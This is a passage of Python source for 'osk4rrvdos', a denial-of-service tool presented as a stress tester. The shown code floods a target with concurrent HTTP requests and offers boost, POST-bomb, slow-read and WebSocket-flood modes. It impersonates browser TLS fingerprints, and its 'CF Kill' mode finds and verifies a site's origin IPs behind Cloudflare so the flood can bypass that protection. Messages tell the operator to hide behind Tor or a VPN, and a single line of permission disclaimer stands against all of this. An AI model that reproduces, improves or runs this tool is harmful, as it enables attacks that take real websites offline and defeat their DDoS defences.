            await asyncio.sleep(random.uniform(0.005, 0.04))
        else:
            await asyncio.sleep(random.uniform(profile["delay_min"], profile["delay_max"]))

def _browser_ssl_context(force_h2=False):
    try:
        ctx = ssl.create_default_context()
        ctx.minimum_version = getattr(ssl.TLSVersion, 'TLSv1_2', ssl.TLSVersion.MINIMUM_SUPPORTED)
        try:
            ctx.set_ciphers(
                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:"
                "ECDHE+AES256:ECDHE+AES128:!aNULL:!eNULL:!MD5"
            )
        except Exception:
            pass
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        if force_h2 and H2_AVAILABLE:
            ctx.set_alpn_protocols(["h2", "http/1.1"])
        else:
            try:
                ctx.set_alpn_protocols(["http/1.1", "h2"])
            except Exception:
                pass
        return ctx
    except Exception:
        return False


async def http_attack(url, host, conns):
    global peak_rps, adaptive_cooldown, use_curl_cffi
    parsed = urlparse(url)
    ssl_ctx = _browser_ssl_context(force_h2=H2_AVAILABLE) if parsed.scheme == "https" else False

    sessions = []
    all_tasks = []

    if use_curl_cffi:
        impersonate_choices = ["chrome", "chrome110", "chrome116", "chrome120", "chrome124",
                               "edge99", "edge101", "safari15_3", "safari15_5", "safari17_0"]
        safe_print(f"< / > Using curl_cffi (browser TLS impersonation) — {len(impersonate_choices)} fingerprints")
        for s_idx in range(session_count):
            imp = random.choice(impersonate_choices)
            sess = CurlAsyncSession(impersonate=imp)
            sessions.append(sess)
            for i in range(conns):
                all_tasks.append(asyncio.create_task(attack_worker(sess, parsed, host, i)))
    else:
        for s_idx in range(session_count):
            conn_kwargs = {
                "ssl": ssl_ctx,
                "limit": conns,
                "limit_per_host": conns,
                "force_close": force_close_conns,
                "enable_cleanup_closed": True,
                "ttl_dns_cache": 300,
            }
            if not force_close_conns:
                conn_kwargs["keepalive_timeout"] = 30
            connector = aiohttp.TCPConnector(**conn_kwargs)
            sess = aiohttp.ClientSession(connector=connector)
            sessions.append(sess)
            for i in range(conns):
                all_tasks.append(asyncio.create_task(attack_worker(sess, parsed, host, i)))

    try:
        while running:
            await asyncio.sleep(0.25)
            if req_rate > peak_rps:
                peak_rps = req_rate
    except asyncio.CancelledError:
        pass

    for t in all_tasks:
        t.cancel()
    await asyncio.gather(*all_tasks, return_exceptions=True)
    for sess in sessions:
        try:
            if use_curl_cffi:
                await sess.close()
            else:
                await asyncio.wait_for(sess.close(), timeout=3)
                await sess.connector.close()
        except Exception:
            pass

def stats_loop():
    global req_rate, rate_times
    while running:
        time.sleep(1.5)
        now = time.time()
        while rate_times and rate_times[0] < now - 2:
            rate_times.popleft()
        if len(rate_times) > 3 and rate_times[0] < now:
            with lock:
                req_rate = len(rate_times) / max(now - rate_times[0], 0.01)
        else:
            req_rate = 0.0
        if running:
            print_live()

def probe_target(target, host):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    async def deep():
        r = {"status":0,"server":"?","size":0,"technologies":[],"headers":{}}
        hdrs = build_headers(host)
        if use_curl_cffi:
            async with CurlAsyncSession(impersonate="chrome") as s:
                try:
                    resp = await s.get(target, headers=hdrs, timeout=8, allow_redirects=True)
                    r["status"] = resp.status_code
                    raw = dict(resp.headers)
                    r["server"] = raw.get("Server", raw.get("server","?"))
                    r["headers"] = {k:v for k,v in list(raw.items())[:20]}
                    r["technologies"] = detect_technologies(raw)
                    r["size"] = len(resp.content)
                except Exception as e:
                    r["server"] = str(e)[:60]
        else:
            ssl_ctx = _browser_ssl_context() if target.startswith("https") else False
            connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=3)
            async with aiohttp.ClientSession(connector=connector) as s:
                try:
                    async with s.get(target, headers=hdrs,
                                     timeout=aiohttp.ClientTimeout(total=8),
                                     allow_redirects=True) as resp:
                        r["status"] = resp.status
                        r["server"] = resp.headers.get("Server", resp.headers.get("server","?"))
                        raw = dict(resp.headers)
                        r["headers"] = {k:v for k,v in list(raw.items())[:20]}
                        r["technologies"] = detect_technologies(raw)
                        body = await resp.read()
                        r["size"] = len(body)
                except Exception as e:
                    r["server"] = str(e)[:60]
        return r
    result = loop.run_until_complete(deep())
    loop.close()
    return result

def wait_for_proxy_validation(initial_msg=True):
    global proxy_validate_done, proxy_validate_result, proxy_alive
    dots = 0
    while not proxy_validate_done.is_set():
        if initial_msg:
            status = f"\r< / > Testing proxies{'.' * (dots % 4)}{' ' * (4 - dots % 4)}"
            safe_print(status, end="", flush=True)
            dots += 1
        time.sleep(0.3)
    valid, total = proxy_validate_result
    fast = len(valid)
    slow = total - fast
    safe_print(f"\r< / > {fast} fast | {slow} filtered" + " " * 20)
    return valid

def _bool_or_prompt(cli_val, prompt_text, interactive=True):
    if cli_val is not None:
        return bool(cli_val)
    if not interactive:
        return False
    return prompt_yn(prompt_text)

def main():
    global running, bypass_active, proxy_mode, proxy_pool, proxy_alive, last_http_code, last_code_label, stopped
    global known_good_paths, total_proxy_used, total_direct_used
    global boost_mode, multi_method, post_bomb, slow_read, adaptive_scaling, payload_size, session_count
    global cf_kill, direct_origin, origin_ips, cf_origin_found, cf_subdomains_found, cf_origin_target
    global use_http2, enable_websocket, force_close_conns, command_line_args

    interactive = True
    cli = getattr(sys.modules[__name__], "command_line_args", None)
    if cli:
        interactive = not cli.target

    try:
        show_banner()
    except Exception:
        pass
    os.system("title osk4rrvdos" if os.name == "nt" else "")

    safe_print("</> Python version detected:", sys.version.split()[0])
    safe_print("</> aiohttp:", aiohttp.__version__)
    safe_print("</> Libraries loaded")
    safe_print("</> HTTP/2 support:", "YES" if H2_AVAILABLE else "Install h2")
    safe_print("</> SOCKS support:", "YES" if SOCKS_AVAILABLE else "Install aiohttp-socks")
    safe_print("</> TLS impersonation:", "YES (curl_cffi)" if CURL_CFFI_AVAILABLE else "Install curl_cffi for CF bypass")
    safe_print("</> Official download only from github.com/osk4rrv/osk4rrvdos")
    safe_print("</> Created by @osk4rrv")
    safe_print("")
    safe_print(" [!] PRIVACY NOTICE — This tool sends real HTTP traffic.")
    safe_print(" [!] Your IP WILL be exposed unless you use VPN / proxy.")
    safe_print(" [!] Pro-Tips: Cloudflare WARP | Tor (127.0.0.1:9050) | Mullvad VPN")
    safe_print(" [!] Use ONLY on targets you own or have explicit permission to test.")

    if cli:
        if cli.config:
            cfg = load_config(cli.config)
            safe_print(f"< / > Loaded config from {cli.config}")
    if not cli or not cli.target:
        input(" Press ENTER to continue (Ctrl+C to exit): ")

    if cli and cli.target:
        target = cli.target.strip()
    else:
        target = input("\n[osk4rrvdos] url > ").strip()
    if not target:
        safe_print("[-] No target provided")
        any_key()
        return
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    parsed = urlparse(target)
    host = parsed.hostname
    scheme = parsed.scheme
    port = parsed.port or (443 if scheme == "https" else 80)

    proxy_mode = False
    bypass_active = _bool_or_prompt(cli.bypass if cli else None, "[osk4rrvdos] Bypass [y/n]: ", interactive)
    boost_mode = _bool_or_prompt(cli.boost if cli else None, "[osk4rrvdos] Boost mode [y/n]: ", interactive)
    multi_method = _bool_or_prompt(cli.multi_method if cli else None, "[osk4rrvdos] Multi-method [y/n]: ", interactive)
    post_bomb = _bool_or_prompt(cli.post_bomb if cli else None, "[osk4rrvdos] POST bomb [y/n]: ", interactive)
    slow_read = _bool_or_prompt(cli.slow_read if cli else None, "[osk4rrvdos] Slow read [y/n]: ", interactive)
    adaptive_scaling = _bool_or_prompt(cli.adaptive if cli else None, "[osk4rrvdos] Adaptive scaling [y/n]: ", interactive)
    cf_kill = _bool_or_prompt(cli.cf_kill if cli else None, "[osk4rrvdos] CF Kill mode [y/n]: ", interactive)

    if cf_kill:
        direct_origin = _bool_or_prompt(cli.direct_origin if cli else None, "[osk4rrvdos] Direct origin attack (bypass CF proxy) [y/n]: ", interactive)

    use_http2 = bool(cli.http2 if cli else False)
    enable_websocket = bool(cli.websocket if cli else False)
    force_close_conns = bool(cli.force_close if cli else False)

    if cli and cli.payload_size:
        payload_size = cli.payload_size * 1024
    elif boost_mode or post_bomb or multi_method:
        if interactive:
            try:
                ps_input = input("[osk4rrvdos] Payload size (KB, default=1): ").strip()
                payload_size = int(ps_input) * 1024 if ps_input else 1024
            except ValueError:
                payload_size = 1024
        else:
            payload_size = 1024

    if cli and cli.sessions:
        session_count = cli.sessions
    elif boost_mode:
        if interactive:
            try:
                sc_input = input("[osk4rrvdos] Session count (default=3): ").strip()
                session_count = int(sc_input) if sc_input else 3
            except ValueError:
                session_count = 3
        else:
            session_count = 3

    safe_print("\n [!] Direct mode — your real IP WILL be visible!")
    safe_print(" [!] Use VPN (Cloudflare WARP / Mullvad) or Tor.")
    if interactive:
        if not prompt_yn("[osk4rrvdos] Continue anyway? [y/n]: "):
            return

    safe_print(f"\n[*] Target: {scheme}://{host}:{port}")

    safe_print("< / > Probing target...")
    probe = probe_target(target, host)
    safe_print(f"    Status: {probe['status']}  Server: {probe['server']}  Size: {probe['size']} bytes")
    if probe['technologies']:
        safe_print(f"    Technologies: {', '.join(probe['technologies'])}")
    safe_print("")

    if cf_kill:
        safe_print("< / > CF Kill: Detecting Cloudflare...")
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        cf_info = loop.run_until_complete(cf_bypass_probe(target, host))
        loop.close()
        if cf_info["cf_detected"]:
            safe_print("    Cloudflare detected!")
        else:
            safe_print("    Cloudflare not detected (CF Kill still active)")
        if cf_info["challenge"]:
            safe_print("    CF challenge detected — attempting bypass techniques")
        safe_print("")

        if direct_origin:
            safe_print("< / > CF Kill: Discovering origin IPs...")
            safe_print("    Scanning subdomains for non-CF IPs...")
            origins = discover_cf_origin(host)
            if origins:
                safe_print(f"    Found {len(origins)} raw origin IP candidate(s)")
                safe_print("    Verifying which IP responds with correct Host header...")
                verified = []
                for ip in origins[:15]:
                    if verify_origin_ip(ip, scheme, host):
                        verified.append(ip)
                if verified:
                    origin_ips = verified
                    cf_origin_found = len(verified)
                    cf_origin_target = verified[0]
                    safe_print(f"    Verified {len(verified)} working origin IP(s):")
                    for ip in verified[:10]:
                        safe_print(f"      → {ip}")
                    safe_print(f"    Using direct origin: {cf_origin_target}")
                else:
                    safe_print("    Found IPs do not respond correctly — falling back to Host-based attack")
                    origin_ips = []
                    cf_origin_found = 0
                    direct_origin = False
            else:
                safe_print("    No origin IPs found — will attack through CF with bypass headers")
                origin_ips = []
                direct_origin = False
            safe_print(f"    Subdomains found: {cf_subdomains_found}")
            safe_print("")

    safe_print("\n< / > Initializing...\n")

    if bypass_active:
        safe_print("< / > Discovering paths for bypass...")
        known_good_paths = discover_known_paths(target, host)
        if known_good_paths:
            safe_print(f"< / > Found {len(known_good_paths)} accessible paths")
        else:
            safe_print("< / > No accessible paths found, bypass will use random paths")
        safe_print("")

    if cli and cli.conns and cli.conns > 0:
        conns = cli.conns
    elif use_curl_cffi:
        conns = 5
    elif cf_kill and direct_origin and origin_ips:
        conns = 120 // session_count
    elif boost_mode:
        conns = 150 // session_count
    elif bypass_active or cf_kill:
        conns = 90 // session_count
    else:
        conns = 50
    conns = max(1, conns)

    total_conns = conns * session_count

    safe_print(f"\n[*] Launching ({total_conns} connections across {session_count} sessions) ...\n")

    safe_print("< / > Pre-flight test...")
    p_target = f"{scheme}://{parsed.netloc}/"
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        async def preflight():
            p_headers = build_headers(host, None, "GET", port=port)
            if use_curl_cffi:
                async with CurlAsyncSession(impersonate="chrome") as s:
                    r = await s.get(p_target, headers=p_headers, timeout=10, allow_redirects=True)
                    return r.status_code
            else:
                ssl_ctx = _browser_ssl_context() if scheme == "https" else False
                connector = aiohttp.TCPConnector(ssl=ssl_ctx, limit=1, force_close=True)
                async with aiohttp.ClientSession(connector=connector) as s:
                    async with s.get(p_target, headers=p_headers,
                                     timeout=aiohttp.ClientTimeout(total=10),
                                     allow_redirects=True) as resp:
                        await resp.read()
                        return resp.status
        p_code = loop.run_until_complete(preflight())
        loop.close()
        safe_print(f"    Pre-flight OK — status {p_code}")
    except Exception as e:
        err_msg = f"Pre-flight FAIL: {type(e).__name__}: {str(e)[:120]} | target={p_target}"
        log_error(err_msg)
        safe_print(f"    Pre-flight FAIL — {type(e).__name__}: {str(e)[:80]}")
        safe_print("    Continuing anyway...")

    print_live()

    threading.Thread(target=stats_loop, daemon=True).start()

    running = True
    stopped = False

    def run_http():
        global running, stopped
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        try:
            loop.run_until_complete(http_attack(target, host, conns))
        except Exception as e:
            with lock:
                last_code_label = f"FATAL: {e}"
            running = False
            stopped = True
            safe_print(f"\n[!] Attack error: {e}")
        finally:
            loop.close()

    http_thread = threading.Thread(target=run_http, daemon=True)
    http_thread.start()

    try:
        while http_thread.is_alive():
            time.sleep(0.3)
    except KeyboardInterrupt:
        pass

    running = False
    stopped = True
    http_thread.join(timeout=5)

    os.system("cls" if os.name == "nt" else "clear")
    safe_print("\n[. . .] Stopping...")
    time.sleep(0.5)

    success_rate = (total_success / total_sent * 100) if total_sent else 0.0
    avg_lat = sum(latency_times) / len(latency_times) if latency_times else 0.0
    safe_print(f"\n [+] Attack finished")
    safe_print(f"     Request sent    : {total_sent}")
    safe_print(f"     Request success : {total_success} ({success_rate:.1f}%)")
    safe_print(f"     Request failed  : {total_failed}")
    safe_print(f"     GET / POST / HEAD: {total_get_sent} / {total_post_sent} / {total_head_sent}")
    safe_print(f"     429 / 503       : {total_429} / {total_503}")
    safe_print(f"     Conn errors     : {connection_errors}")
    safe_print(f"     Avg latency     : {avg_lat*1000:.1f} ms")
    safe_print(f"     Bytes sent      : {total_bytes_sent / 1024 / 1024:.1f} MB")
    safe_print(f"     Bytes recv      : {total_bytes_recv / 1024 / 1024:.1f} MB")
    safe_print(f"     Peak RPS        : {peak_rps:.1f}")
    if cf_kill:
        safe_print(f"     CF Kill         : ACTIVE")
        safe_print(f"     CF bypasses     : {cf_bypass_count}")
        safe_print(f"     Origin IPs      : {cf_origin_found}")
        safe_print(f"     Subdomains found: {cf_subdomains_found}")
        if direct_origin and cf_origin_target:
            safe_print(f"     Direct origin   : {cf_origin_target}")
    any_key()

def parse_args():
    parser = argparse.ArgumentParser(description="osk4rrvdos - network stress testing tool")
    parser.add_argument("--target", "-t", type=str, help="Target URL")
    parser.add_argument("--bypass", "-b", action="store_true", help="Enable bypass")
    parser.add_argument("--boost", "-B", action="store_true", help="Enable boost mode")
    parser.add_argument("--multi-method", "-m", action="store_true", help="Enable multi-method")
    parser.add_argument("--post-bomb", "-P", action="store_true", help="Enable POST bomb")
    parser.add_argument("--slow-read", "-s", action="store_true", help="Enable slow read")
    parser.add_argument("--adaptive", "-a", action="store_true", help="Enable adaptive scaling")
    parser.add_argument("--cf-kill", "-c", action="store_true", help="Enable CF Kill mode")
    parser.add_argument("--direct-origin", "-d", action="store_true", help="Enable direct origin attack")
    parser.add_argument("--http2", "-2", action="store_true", help="Force HTTP/2 where supported")
    parser.add_argument("--websocket", "-w", action="store_true", help="Enable WebSocket flood")
    parser.add_argument("--force-close", "-f", action="store_true", help="Force close connections after each request")
    parser.add_argument("--payload-size", type=int, default=1, help="Payload size in KB")
    parser.add_argument("--sessions", type=int, default=3, help="Number of sessions")
    parser.add_argument("--conns", type=int, default=0, help="Connections per session (0=auto)")
    parser.add_argument("--config", "-C", type=str, help="Config file path")
    return parser.parse_args()

def load_config(path):
    cfg = configparser.ConfigParser()
    if not os.path.isfile(path):
        return {}
    try:
        cfg.read(path)
        data = {}
        if cfg.has_section("main"):
            data = dict(cfg.items("main"))
        return data
    except Exception:
        return {}

if __name__ == "__main__":
    try:
        command_line_args = parse_args()
        main()
    except KeyboardInterrupt:
        pass
